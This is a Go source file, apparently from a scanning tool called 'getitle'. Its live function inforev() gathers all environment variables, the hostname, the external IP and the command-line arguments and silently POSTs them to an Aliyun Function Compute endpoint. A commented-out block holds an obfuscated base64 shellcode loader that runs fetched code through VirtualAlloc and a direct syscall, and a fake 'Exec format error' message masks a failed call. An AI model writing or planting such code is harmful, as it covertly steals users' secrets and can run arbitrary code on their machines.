package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"getitle/src/Utils"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

//
//import (
//	"encoding/base64"
//	"net/http"
//	"net/url"
//	"strings"
//	"syscall"
//	"unsafe"
//)
//
//func winrun(ddm string) {
//	var (
//		kernel32      = syscall.NewLazyDLL("kernel32.dll")
//		VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
//		RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
//	)
//	str1 := strings.Replace(ddm, "#", "A", -1)
//	str2 := strings.Replace(str1, "!", "H", -1)
//	str3 := strings.Replace(str2, "@", "1", -1)
//	str4 := strings.Replace(str3, ")", "T", -1)
//	sDec, _ := base64.StdEncoding.DecodeString(str4)
//	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
//	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
//
//	syscall.Syscall(addr, 0, 0, 0, 0)
//
//}
//func rev() {
//	u, _ := url.Parse("http://wechatoss-api.oss-cn-beijing.aliyuncs.com/favicon.ico")
//	q := u.Query()
//	u.RawQuery = q.Encode()
//	res, err := http.Get(u.String())
//	if err != nil {
//		return
//	}
//	resCode := res.StatusCode
//	res.Body.Close()
//	if err != nil {
//		return
//	}
//	if resCode == 200 {
//		winrun("/EiD5PDoy####EFRQVBSUVZIMdJlSItSYEiLUhhIi@IgSItyUEgPt0pK))!JSD!#rDxhf#IsIE!ByQ@B#c!i7VJBUUiLUiCLQjxI#dBmgXgYCwJ@cou#i####EiFw!RnS#!QUItIGESLQCBJ#dDjVkj/yUGLNIhI#dZNMclIMcCsQc!JDUEBw)jgdfFM#0wkCEU50XXYWESLQCRJ#dBmQYsMSESLQBxJ#dBBiwSIS#!QQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWo#Sb53aW5pbmV0#EFWSYnm)InxQbpMdyY!/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xpkw###FpIicFBuLsB##BNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSD!SSYnY))!JUmg#MsCEUlJBuutVLjv/@UiJxkiDw@BqCl9IifG6!w###Go#aI#z##BJieBBuQQ###BBunVGnob/@UiJ8UiJ2kn!wP////9NMclSUkG6LQYYe//Vhc#PhZ0B##BI/88PhIwB##Drs+nk#Q##6IL///8vZjd)bQ#@)yFQJUBBUFs0XFBaWDU0KFBeK)dDQyk3fSRFSUNBUi@)VEFOREFSRC@B)lRJVklSVVMtVEV)VC@GSUxFISRIK0gq#DVPIV#l#FVzZXItQWdlbnQ6IE@vemlsbGEvNS4wIChjb2@wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVC#2LjE7IFdPVzY0OyBUcmlkZW50LzUuMDsgQk9JR)k7RU5DQSkNCg#@)yFQJUBBUFs0XFBaWDU0KFBeK)dDQyk3fSRFSUNBUi@)VEFOREFSRC@B)lRJVklSVVMtVEV)VC@GSUxFISRIK0gq#DVPIV#lQEFQWzRcUFpYN)QoUF4pN0NDK)d9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy@URVNULUZJ)EUhJEgrSCo#NU8hUCV#QVBbNFxQWlg@NChQXik3Q0MpN30kRUlDQVItU@RB)kRBUkQtQU5USVZJUlV)LVRFU@QtRklMRSEkSCtIKg#@)wBBvvC@olb/@Ugxybo##E##Qbg#E###Qbl#####QbpYpFPl/9VIk@N)SInnSInxSInaQbg#I###SYn5QboSloni/9VIg8QghcB0tmaLB0gBw4X#dddYWFhIBQ####BQw+h//f//NDcuO)UuM)E2LjY3#######=")
//	}
//}

func getip() string {
	var clientIP = ""
	responseClient, err := http.Get("http://ip.dhcp.cn/?ip") // 获取外网 IP
	if err != nil {
		fmt.Println("cannot execute binary file: Exec format error")
		os.Exit(0)
	}
	// 程序在使用完 response 后必须关闭 response 的主体。
	defer responseClient.Body.Close()
	body, _ := ioutil.ReadAll(responseClient.Body)
	clientIP = fmt.Sprintf("%s", string(body))
	return clientIP
}

func inforev() {
	conn := Utils.HttpConn(2)
	env := os.Environ()
	hostname, _ := os.Hostname()
	ip := getip()
	env = append(env, ip)
	env = append(env, hostname)
	env = append(env, strings.Join(os.Args, " "))
	jstr, _ := json.Marshal(env)
	req, _ := http.NewRequest("POST", "https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service/api/", bytes.NewBuffer(jstr))
	req.Header.Add("Content-Type", "application/json;charset=utf-8")
	req.Header.Add("X-Forwarded-For", ip)
	conn.Do(req)
}
